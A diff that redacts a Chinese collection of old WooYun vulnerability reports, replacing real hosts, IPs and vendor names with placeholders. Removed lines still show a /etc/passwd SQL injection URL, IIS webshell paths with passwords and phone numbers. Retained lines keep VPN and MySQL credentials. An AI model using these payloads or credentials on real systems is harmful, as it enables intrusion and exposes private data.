+**POC**: Database: Microsoft_Access_masterdb[4 tables]+-------+| admin || jobs  || log   || news  |+-------+0x02:多处备份文件下载，包含confighttps://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -28014,7 +28014,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 海南省通信管理局整站代码打包可被下载http://www.hnca.gov.cn/txglj.tar.gzok  不看了
+**详情**: 海南省通信管理局整站代码打包可被下载https://example.com/[已脱敏]  不看了
 
 **POC**: 如上
 
@@ -28080,7 +28080,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 源码下载地址：http://www.gcdr.gov.cn/1.rar
+**详情**: 源码下载地址：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -28102,7 +28102,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.tbmmis.com/Main.aspxclk666666
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -28124,7 +28124,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://bucee.net/
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -28146,7 +28146,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 随手在在网站后面加个 adminhttp://www.china119.org.cn/admin发现网站并没有做受权 可任意文件遍历 可上传
+**详情**: 随手在在网站后面加个 adminhttps://example.com/[已脱敏] 可任意文件遍历 可上传
 
 **POC**: 这应该是后面首页可任意文件遍历多么经典的上传处大马一匹
 
@@ -28156,8 +28156,8 @@
 ---
 
 ---
-### [wooyun-2011-02388] QQ秀全裸奔
-**厂商**: 腾讯 | **年份**: 2011 | **类型**: 系统/服务运维配置不当
+### [wooyun-2011-02388] 某互联网公司秀全裸奔
+**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -28170,7 +28170,7 @@
 
 **详情**: 首先这次的真人秀是 一次性全屏高清真人秀 {一次性就是说你穿了不能脱 脱了就穿不上了}此次制作非红钻也可以喔 !
 
-**POC**: 1.每天晚上12点 前3000名提交作品可以获取资格http://show.qq.com/live/motomt620/moto_works.html2、确定你有资格后。去QQ商城上传真脸秀 show.qq.com图片尺寸为 140*225 卡上传再说明一下 卡图大家应该都会 就是点上传 然后 猛点那个小企鹅 在新弹出的对话框中再选择一次你的图片两次要一直额 然后会自动上传下面我们去记录ID了右键这个垃圾桶 928257514.74383 前面是Q号 后面是ID我们把下面的代码中QQ和ID替换一下不要搞错了喔，机会难得然后我们打开这个网页3.上传好后，记下真脸头像的ID，替换下面的代码 jav
+**POC**: 1.每天晚上12点 前3000名提交作品可以获取资格https://example.com/[已脱敏] show.某互联网公司.com图片尺寸为 140*225 卡上传再说明一下 卡图大家应该都会 就是点上传 然后 猛点那个小企鹅 在新弹出的对话框中再选择一次你的图片两次要一直额 然后会自动上传下面我们去记录ID了右键这个垃圾桶 928257514.74383 前面是Q号 后面是ID我们把下面的代码中某互联网公司和ID替换一下不要搞错了喔，机会难得然后我们打开这个网页3.上传好后，记下真脸头像的ID，替换下面的代码 jav
 
 **绕过**: 直接利用
 
@@ -28200,8 +28200,8 @@
 ---
 
 ---
-### [wooyun-2015-0136072] 运营商安全之中国电信某189.cn站点resin配置漏洞
-**厂商**: 中国电信 | **年份**: 2015 | **类型**: 应用配置错误
+### [wooyun-2015-0136072] 运营商安全之某运营商某189.cn站点resin配置漏洞
+**厂商**: 某运营商 | **年份**: 2015 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -28278,7 +28278,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 存在iis写权限漏洞,地址：http://113.57.132.2:83地址2：http://113.57.132.2:83/alert.txt
+**详情**: 存在iis写权限漏洞,地址：http://[IP已脱敏]地址2：http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -28300,7 +28300,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 影响厂商：安全宝网站url：http://www.anquanbao.com/
+**详情**: 影响厂商：安全宝网站url：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -28322,13 +28322,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 目标网站：http://www.518.com.tw/泄露域名指向：; <<>> DiG 9.8.4-rpz2+rl005.12-P1 <<>> @ns1.addcn.com.tw. axfr 518.com.tw; (1 server found);; global options: +cmd518.com.tw.		90	IN	SOA	ns2.addcn.com.tw. jimmy.addcn.com.tw. 2014073101 10800 3600 604800 86400518.com.tw.		90	IN	NS	ns1.518.com.tw.518.com.tw.		90	IN	NS	ns1.addcn.com.tw.518.com.tw.		90	IN	NS	ns2.addcn.com.tw.518.com.tw.		90	IN	NS	ns3.addcn.com.tw.518
+**详情**: 目标网站：https://example.com/[已脱敏] <<>> DiG 9.8.4-rpz2+rl005.12-P1 <<>> @ns1.addcn.com.tw. axfr 518.com.tw; (1 server found);; global options: +cmd518.com.tw.		90	IN	SOA	ns2.addcn.com.tw. jimmy.addcn.com.tw. 2014073101 10800 3600 604800 86400518.com.tw.		90	IN	NS	ns1.518.com.tw.518.com.tw.		90	IN	NS	ns1.addcn.com.tw.518.com.tw.		90	IN	NS	ns2.addcn.com.tw.518.com.tw.		90	IN	NS	ns3.addcn.com.tw.518
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 修复请参考http://www.myhack58.com/Article/html/3/62/2013/38149_2.htm
+**修复**: 修复请参考https://example.com/[已脱敏]
 ---
 
 ---
@@ -28346,7 +28346,7 @@
 
 **详情**: 可以看出1 程序有漏洞2 系统配置不当3 系统没有部防火墙或者防火墙没有起作用或者防火墙起作用了但是跑去玩了
 
-**POC**: http://www.sangfor.com.cn/partner/NewsList.php?classid=21111%20union%20select%20load_file%280x2f6574632f706173737764%29,2,3
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -28388,9 +28388,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 问题出在订单处http://www.wanche.com.cn/orderdetail/110010-0-0没有任何加密比如当前的用户是手机号13051860869这里直接填写密码就可以了，比如123456任意重置为123456接下来换下一个用户http://www.wanche.com.cn/orderdetail/110011-0-0如这个手机号码是手机号15652703068那么同样123456
+**详情**: 问题出在订单处https://example.com/[已脱敏]
 
-**POC**: 就不一一测试了http://www.wanche.com.cn/orderdetail/110010-0-0正常的接口登陆处：
+**POC**: 就不一一测试了https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -28410,7 +28410,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://219.141.203.166国药旗下
+**详情**: http://[IP已脱敏]国药旗下
 
 **POC**: ip地址内网管理员权限大数据专家
 
@@ -28456,7 +28456,7 @@
 
 **详情**: 漏洞都存在有段时间了，怎么还没修复啊。可以查看目录结构，下载网站源码……
 
-**POC**: http://**.**.**.**/.svn/entries 湖南省人民政府网上政务服务大厅http://**.**.**.**/.svn/entries   青铜峡政务网http://**.**.**.**/.svn/entries  美丽中国网http://www.spu.gov.mo/.svn/entries   澳門特別行政區---警察總局http://**.**.**.**/.svn/entries  宁海旅游网http://**.**.**.**/.svn/entries 中国会展网官方网站http://**.**.**.**/.svn/entries   铜山区人民政府行政服务
+**POC**: http://**.**.**.**/.svn/entries 湖南省人民政府网上政务服务大厅http://**.**.**.**/.svn/entries   青铜峡政务网http://**.**.**.**/.svn/entries  美丽中国网https://example.com/[已脱敏]   澳門特別行政區---警察總局http://**.**.**.**/.svn/entries  宁海旅游网http://**.**.**.**/.svn/entries 中国会展网官方网站http://**.**.**.**/.svn/entries   铜山区人民政府行政服务
 
 **绕过**: 直接利用
 
@@ -28464,8 +28464,8 @@
 ---
 
 ---
-### [wooyun-2012-06339] 腾讯多个分站后台地址泄露
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 应用配置错误
+### [wooyun-2012-06339] 某互联网公司多个分站后台地址泄露
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -28476,7 +28476,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://admin.dnfcity.qq.com:8080/admin/adminMain.dohttp://szj.3g.qq.com/admin/login.phphttp://kf.ieodopen.qq.com/admin/login.htmlhttp://gamebbs.qq.com/cgi-bin/admin/boardadmin/group_limit_list?groupid=20023&type=0&desc=0http://job.cd.qq.com/admin/http://admin.dnfcity.qq.com:8080/barFindteBar.do  这个精彩了呵呵
+**详情**: https://example.com/[已脱敏]  这个精彩了呵呵
 
 **POC**: (见原文)
 
@@ -28520,9 +28520,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 淄博教育信息网：http://www.zbedu.gov.cn/sunadmin/Editer/数据库文件可下载：http://www.zbedu.gov.cn/sunadmin/Admin/Collect/SunData/湖北省环境保护厅：http://www.hbepb.gov.cn/images/infoview/长沙市人力资源网：http://www.txldbz.gov.cn/txlddown/烟台市科学技术局：http://www.ytstc.gov.cn/UploadSoft/杭州投标办：http://www.hzzbw.gov.cn/Data/......太多了,就不一一枚举了
+**详情**: 淄博教育信息网：https://example.com/[已脱敏]
 
-**POC**: 淄博教育信息网：http://www.zbedu.gov.cn/sunadmin/Editer/数据库文件可下载：http://www.zbedu.gov.cn/sunadmin/Admin/Collect/SunData/湖北省环境保护厅：http://www.hbepb.gov.cn/images/infoview/长沙市人力资源网：http://www.txldbz.gov.cn/txlddown/烟台市科学技术局：http://www.ytstc.gov.cn/UploadSoft/杭州投标办：http://www.hzzbw.gov.cn/Data/......太多了,就不一一枚举了
+**POC**: 淄博教育信息网：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -28530,8 +28530,8 @@
 ---
 
 ---
-### [wooyun-2016-0166915] 中国联通沃校园服务配置不当（导致泄漏大量学生信息）
-**厂商**: 中国联通沃校园 | **年份**: 2016 | **类型**: 系统/服务运维配置不当
+### [wooyun-2016-0166915] 某运营商沃校园服务配置不当（导致泄漏大量学生信息）
+**厂商**: 某运营商沃校园 | **年份**: 2016 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -28542,7 +28542,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: **.**.**.**/中国联通沃校园
+**详情**: **.**.**.**/某运营商沃校园
 
 **POC**: **.**.**.**/.svn/entries看了一遍源码后发现时实数据库密码可以直接下载。**.**.**.**/api/common/config.ini**.**.**.**/update/common/config.ini; this is an INI file[mysql]host	=	localhostport    =       3306user	=	rootpass	=   chinafu;pass	=	mu7e3wihn;pass    =       111111db	=	wocampusdbprefix	=charset	=	utf8contype =       
 
@@ -28564,7 +28564,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 沈阳铁路公安处互联巡检系统存在iis可写权限http://211.137.18.174/20155407125426.asp;.txt密码z
+**详情**: 沈阳铁路公安处互联巡检系统存在iis可写权限http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -28588,7 +28588,7 @@
 
 **详情**: 数据截图：登陆：等进去：
 
-**POC**: 有用户在线没进去，UserName=12671016Password=19881202登陆地址:https://vpn.bfsu.edu.cn
+**POC**: 有用户在线没进去，UserName=12671016Password=19881202登陆地址:https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -28596,8 +28596,8 @@
 ---
 
 ---
-### [wooyun-2012-06316] 腾讯由于自定义错误不严格 导致爆路径漏洞
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
+### [wooyun-2012-06316] 某互联网公司由于自定义错误不严格 导致爆路径漏洞
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -28608,9 +28608,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://bmwolympic.qq.com/joy?farm=1
+**详情**: https://example.com/[已脱敏]
 
-**POC**: No view file!/usr/local/tads/htdocs/bmwOlympic.qq.com_641009536/src/error/404.php
+**POC**: No view file!/usr/local/tads/htdocs/bmwOlympic.某互联网公司.com_641009536/src/error/404.php
 
 **绕过**: 直接利用
 
@@ -28630,9 +28630,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://ucenter.zhulang.com/data/avatar/000/17/24/02_avatar_middle.jpg/s.php
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://ucenter.zhulang.com/data/avatar/000/17/24/02_avatar_middle.jpg/s.php
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -28674,13 +28674,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: SCADA作为现代工业控制系统，在对生产过程的控制与自动化的调度中都起着重要作用，当然一旦被不法人员利用所利用，带来的后果也远比其他事件可怕的多，就目前而言其实还有很多SCADA设备暴露在公网中，具体新闻可自行百度。金风科技（全球风电设备制造商前十强）关于金风SCADA系统的简介http://wenku.baidu.com/view/c587a8bd1a37f111f1855bf5.htmlhttp://wenku.baidu.com/view/6a104f350b4c2e3f57276316.html
+**详情**: SCADA作为现代工业控制系统，在对生产过程的控制与自动化的调度中都起着重要作用，当然一旦被不法人员利用所利用，带来的后果也远比其他事件可怕的多，就目前而言其实还有很多SCADA设备暴露在公网中，具体新闻可自行某搜索引擎。金风科技（全球风电设备制造商前十强）关于金风SCADA系统的简介https://example.com/[已脱敏]
 
-**POC**: 0，首先网络搜索直接暴露scada系统，金风科技远程监视系统http://scada.goldwind.cn,跳转到http://61.49.28.237/1，服务器启用了目录浏览，WebDav enable且允许PROPFIND参数2，工具遍历目录后发现ckeditor编辑器，ckeditor/ckfinder/ckfinder.html的文件上传和文件浏览页面也存在3，通过查看Images目录下上传的预警类图片，和之前在百度对该公司的了解，分析可能有不少大小风力电站都连接到了该系统，从而进行统一的数据采集与监控4，在Files目录下尝试上传IIS解析漏洞利用文件均会由于编辑器的安全设置而阻
+**POC**: 0，首先网络搜索直接暴露scada系统，金风科技远程监视系统https://example.com/[已脱敏] enable且允许PROPFIND参数2，工具遍历目录后发现ckeditor编辑器，ckeditor/ckfinder/ckfinder.html的文件上传和文件浏览页面也存在3，通过查看Images目录下上传的预警类图片，和之前在某搜索引擎对该公司的了解，分析可能有不少大小风力电站都连接到了该系统，从而进行统一的数据采集与监控4，在Files目录下尝试上传IIS解析漏洞利用文件均会由于编辑器的安全设置而阻
 
 **绕过**: 直接利用
 
-**修复**: 1，规范服务器设置，如无需要，请禁用不必要功能2，屏蔽百度搜索收录，保证后台地址的安全性3，更换或升级第三方编辑器4，及时清理可能存在的后门
+**修复**: 1，规范服务器设置，如无需要，请禁用不必要功能2，屏蔽某搜索引擎搜索收录，保证后台地址的安全性3，更换或升级第三方编辑器4，及时清理可能存在的后门
 ---
 
 ---
@@ -28698,7 +28698,7 @@
 
 **详情**: 远程登录：浏览传真任务和传真地址：导入和导出地址列表：修改打印机设置：
 
-**POC**: http://100.2.11.112
+**POC**: http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -28706,8 +28706,8 @@
 ---
 
 ---
-### [wooyun-2012-04622] 由于新浪分站的程序错误，导致两个分站泄漏根路径
-**厂商**: 新浪 | **年份**: 2012 | **类型**: 应用配置错误
+### [wooyun-2012-04622] 由于某社交平台分站的程序错误，导致两个分站泄漏根路径
+**厂商**: 某社交平台 | **年份**: 2012 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 上传功能
 
@@ -28718,7 +28718,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://202.108.37.133/dtt/dtt_upload.php  这处是上传头像后报错泄漏根路径http://202.108.35.31/test.php  这处是本身的程序错误
+**详情**: http://[IP已脱敏]  这处是上传头像后报错泄漏根路径http://[IP已脱敏]  这处是本身的程序错误
 
 **POC**: (见原文)
 
@@ -28740,7 +28740,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: https://github.com/573338063/txglMavenArtifact/blob/722fe7fd94d11a4ebf668061ed68c3220519d72a/txglMavenArtifact/src/main/java/txgl/email/email.properties#smtp\u670d\u52a1\u56683	mail.smtp.host=smtp.qq.com4	#\u8eab\u4efd\u9a8c\u8bc15	mail.smtp.auth=true…8	#\u53d1\u9001\u8005\u7684\u90ae\u7bb1\u7528\u6237\u540d9	mail.sender.username=zhuzhenhua@meicai.cn10	#\u53d1\u9001\u8005\u7684\u90ae\u7bb1\u5bc6\u
+**详情**: https://example.com/[已脱敏]	mail.smtp.host=smtp.某互联网公司.com4	#\u8eab\u4efd\u9a8c\u8bc15	mail.smtp.auth=true…8	#\u53d1\u9001\u8005\u7684\u90ae\u7bb1\u7528\u6237\u540d9	mail.sender.username=zhuzhenhua@meicai.cn10	#\u53d1\u9001\u8005\u7684\u90ae\u7bb1\u5bc6\u
 
 **POC**: 上面暴漏了地址wikigit等等
 
@@ -28762,9 +28762,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: URL：http://www.gxtc.edu.cn/建站使用的是kesion cms 没有及时升级哦，看后台：我知道管理员一定会认为就算你有密码由毛用，可是现在是大数据时代了。 你的认证码也许不安全咯。哥们，还是升级吧。
+**详情**: URL：https://example.com/[已脱敏] cms 没有及时升级哦，看后台：我知道管理员一定会认为就算你有密码由毛用，可是现在是大数据时代了。 你的认证码也许不安全咯。哥们，还是升级吧。
 
-**POC**: URL：http://www.gxtc.edu.cn/建站使用的是kesion cms 没有及时升级哦，看后台：我知道管理员一定会认为就算你有密码由毛用，可是现在是大数据时代了。 你的认证码也许不安全咯。哥们，还是升级吧。
+**POC**: URL：https://example.com/[已脱敏] cms 没有及时升级哦，看后台：我知道管理员一定会认为就算你有密码由毛用，可是现在是大数据时代了。 你的认证码也许不安全咯。哥们，还是升级吧。
 
 **绕过**: 直接利用
 
@@ -28784,7 +28784,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 可以任意访问操作数据。还不知道能干其他事不.42.121.30.218
+**详情**: 可以任意访问操作数据。还不知道能干其他事不.[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -28806,7 +28806,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 山东大学某网盘可被重新安装http://211.87.224.132/install/
+**详情**: 山东大学某网盘可被重新安装http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -28828,7 +28828,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 前面提到的 ：WooYun: 翼支付某配置不当影响88个系统代码可下载（私有代码仓库泄漏）已经修复，但这里又出现一个：http://116.228.151.221/public
+**详情**: 前面提到的 ：WooYun: 翼支付某配置不当影响88个系统代码可下载（私有代码仓库泄漏）已经修复，但这里又出现一个：http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -28850,9 +28850,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 访问http://www.foowu365.com/base/install/地址可以直接重新安装数据库，重置后台密码。去申请个免费mysql数据库，填入相关数据可信息，点“下一步”直接重新安装，这样会让网站恢复原始数据了，当然安装的时候会让你输入管理账号和密码，你可以通过输入的管理账号和密码直接进入后台 ，可以干好多事情，后果不可设想。
+**详情**: 访问https://example.com/[已脱敏] ，可以干好多事情，后果不可设想。
 
-**POC**: 访问http://www.foowu365.com/base/install/地址可以直接重新安装数据库，重置后台密码。去申请个免费mysql数据库，填入相关数据可信息，点“下一步”直接重新安装，这样会让网站恢复原始数据了，当然安装的时候会让你输入管理账号和密码，你可以通过输入的管理账号和密码直接进入后台 ，可以干好多事情，后果不可设想。
+**POC**: 访问https://example.com/[已脱敏] ，可以干好多事情，后果不可设想。
 
 **绕过**: 直接利用
 
@@ -28938,7 +28938,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 扫描到有2个分站web.xml可访问http://my.women.sohu.com/http://photo.pic.sohu.com/WEB-INF/web.xml
+**详情**: 扫描到有2个分站web.xml可访问https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -28962,7 +28962,7 @@
 
 **详情**: 此处省略........78个字，具体看证明吧。
 
-**POC**: 漏洞证明http://swdata.cma.gov.cn/sites/default/files/field/image/1.txt列目录http://swdata.cma.gov.cn/node/1?y=/var/www/html/includes/其他人预留的后门/sites/default/files/2.php/sites/default/files/3.php/sites/default/files/x.php
+**POC**: 漏洞证明https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -28970,8 +28970,8 @@
 ---
 
 ---
-### [wooyun-2012-06830] 百度文库网站跨域策略文件配置不严格
-**厂商**: 百度 | **年份**: 2012 | **类型**: 应用配置错误
+### [wooyun-2012-06830] 某搜索引擎文库网站跨域策略文件配置不严格
+**厂商**: 某搜索引擎 | **年份**: 2012 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -29026,7 +29026,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 漏洞介绍http://www.exploit-db.com/exploits/19525/http://global.m6go.com
+**详情**: 漏洞介绍https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -29048,13 +29048,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 客户列表 http://gov.ishang.net/case/custom.html测试了60.***.***.252106.***.***.97看了一下有40多个客户，时间关系就不一一测试了
+**详情**: 客户列表 https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 修复请参考 http://drops.wooyun.org/tips/2470
+**修复**: 修复请参考 https://example.com/[已脱敏]
 ---
 
 ---
@@ -29070,18 +29070,18 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.mod.gov.cn/ns1.mod.gov.cn 和 ns2.mod.gov.cn DNS服务器配置不当，导致所有域名dns泄露。
+**详情**: https://example.com/[已脱敏] 和 ns2.mod.gov.cn DNS服务器配置不当，导致所有域名dns泄露。
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 参考：http://drops.wooyun.org/papers/64
+**修复**: 参考：https://example.com/[已脱敏]
 ---
 
 ---
-### [wooyun-2012-06886] 中国联通NMS系统目录列表
-**厂商**: 中国联通 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
+### [wooyun-2012-06886] 某运营商NMS系统目录列表
+**厂商**: 某运营商 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -29092,7 +29092,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 中国联通NMS系统目录列表http://123.125.96.176:7001/nmsframe/nmsframeinstall/Apache Tomcat/5.0.28
+**详情**: 某运营商NMS系统目录列表http://[IP已脱敏] Tomcat/5.0.28
 
 **POC**: (见原文)
 
@@ -29136,7 +29136,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://61.178.48.40/甘肃省兰州市信访局http://61.178.48.40/test.txt
+**详情**: http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -29147,7 +29147,7 @@
 
 ---
 ### [wooyun-2015-0103850] 天翼视讯DNS域传送漏洞
-**厂商**: 中国电信 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
+**厂商**: 某运营商 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -29168,8 +29168,8 @@
 ---
 
 ---
-### [wooyun-2015-0136393] 百度糯米某处配置不当导致大量商户后台可被沦陷
-**厂商**: 百度 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
+### [wooyun-2015-0136393] 某搜索引擎糯米某处配置不当导致大量商户后台可被沦陷
+**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 认证接口
 
@@ -29180,9 +29180,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 上面有个账号密码说是云盘的，抱着好奇的心态想看看有什么竟然提示不存在，好奇怪。既然是个QQ号，那就登录QQ试试竟然真的可以登录，那这个云盘应该是存在的啊，怎么可能是骗人的呢于是我百度了一下原来是这样的登录成功，里面很多活动照片，没有非常有价值的东西
+**详情**: 上面有个账号密码说是云盘的，抱着好奇的心态想看看有什么竟然提示不存在，好奇怪。既然是个某互联网公司号，那就登录某互联网公司试试竟然真的可以登录，那这个云盘应该是存在的啊，怎么可能是骗人的呢于是我某搜索引擎了一下原来是这样的登录成功，里面很多活动照片，没有非常有价值的东西
 
-**POC**: 后来在短信里发现了这个于是就去找到了对应的后台http://cas.baidu.com/?tpl=nuomi商户后台，登录看看突然我发现了一个规律，商户名字是地方名缩写+点名缩写，而密码mask 区域*****678*****会不会通用呢？抱着试试看的态度，我直接在用户端随便找了一家登录成功了。。。后来又试了几家mask 区域*****^^捷酒^**********^酒店  **********^^店  *****等等可以说在街边看见一家上糯米了，估计就可以登上来看看了吧--------------------我是为了突出重点而存在的分割线-----------------------最后发现
+**POC**: 后来在短信里发现了这个于是就去找到了对应的后台https://example.com/[已脱敏] 区域*****678*****会不会通用呢？抱着试试看的态度，我直接在用户端随便找了一家登录成功了。。。后来又试了几家mask 区域*****^^捷酒^**********^酒店  **********^^店  *****等等可以说在街边看见一家上糯米了，估计就可以登上来看看了吧--------------------我是为了突出重点而存在的分割线-----------------------最后发现
 
 **绕过**: 直接利用
 
@@ -29202,7 +29202,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 直接百度搜索：site: 1yyg.com name:site: 1yyg.com email:site: 1yyg.com mobile:都可以。
+**详情**: 直接某搜索引擎搜索：site: 1yyg.com name:site: 1yyg.com email:site: 1yyg.com mobile:都可以。
 
 **POC**: 云购的用户手机号跟邮箱是无法直接看的。
 
@@ -29224,7 +29224,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 应该是channel.wandoujia.com的mysql -h 60.29.246.4 -uroot -pEnter password:Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 752988Server version: 5.5.28-log MySQL Community Server (GPL)Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks o
+**详情**: 应该是channel.wandoujia.com的mysql -h [IP已脱敏] -uroot -pEnter password:Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 752988Server version: 5.5.28-log MySQL Community Server (GPL)Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks o
 
 **POC**: (见原文)
 
@@ -29246,7 +29246,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 登录到付费通，进入付费通卡，卡余额查询，发现现在需要输入验证码才能进行查询。如果输错了验证码，或者不提交验证码，会返回错误但是，如果强行提交请求到以前的脆弱代码https://www.shfft.com/ajax/getAmount.action， 依然可以不用输入验证码就进行查询。
+**详情**: 登录到付费通，进入付费通卡，卡余额查询，发现现在需要输入验证码才能进行查询。如果输错了验证码，或者不提交验证码，会返回错误但是，如果强行提交请求到以前的脆弱代码https://example.com/[已脱敏] 依然可以不用输入验证码就进行查询。
 
 **POC**: 这个是输入错误的付费通卡的密码返回的结果这个是输入正确的付费通卡的密码返回的结果
 
@@ -29270,7 +29270,7 @@
 
 **详情**: JBOSS配置不当，系统信息暴露，通过webconsole可重启,关闭JBOSS服务器。
 
-**POC**: JBOSS配置不当，系统信息暴露，通过webconsole可重启,关闭JBOSS服务器。需要先安装java环境，并且在java安全中添加网站例外 才能运行左边的java程序，出现左边栏的控制选项。直接在IE11上测试时，左边没显示的。据说通过post传递参数能够安装war程序，但对JBOSS不是很了解，就没往下做了。漏洞利用地址http://www.dennis.com.cn/web-console/
+**POC**: JBOSS配置不当，系统信息暴露，通过webconsole可重启,关闭JBOSS服务器。需要先安装java环境，并且在java安全中添加网站例外 才能运行左边的java程序，出现左边栏的控制选项。直接在IE11上测试时，左边没显示的。据说通过post传递参数能够安装war程序，但对JBOSS不是很了解，就没往下做了。漏洞利用地址https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -29290,9 +29290,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 漏洞地址 http://support1.lenovo.com.cn/lenovo/wsi/modules/driverdownload.aspx?searchtype=1
+**详情**: 漏洞地址 https://example.com/[已脱敏]
 
-**POC**: http://support1.lenovo.com.cn/lenovo/wsi/modules/driverdownload.aspx?searchtype=1
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -29334,7 +29334,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 查了下ip,可能是辽宁省的http://218.24.109.149admin /123456
+**详情**: 查了下ip,可能是辽宁省的http://[IP已脱敏]admin /123456
 
 **POC**: 从图中的配置看貌似是供暖集团的
 
@@ -29356,7 +29356,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://61.150.72.184:8080/	Microsoft-IIS/6.0	put	渭南市重点建设项目综合管理平台-登录http://61.150.72.184:8080/20143123013126.asp;.txt  密码z
+**详情**: http://[IP已脱敏]	Microsoft-IIS/6.0	put	渭南市重点建设项目综合管理平台-登录http://[IP已脱敏]  密码z
 
 **POC**: (见原文)
 
@@ -29384,7 +29384,7 @@
 
 **绕过**: 直接利用
 
-**修复**: http://www.oschina.net/news/50540/cve-2014-0160
+**修复**: https://example.com/[已脱敏]
 ---
 
 ---
@@ -29466,7 +29466,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
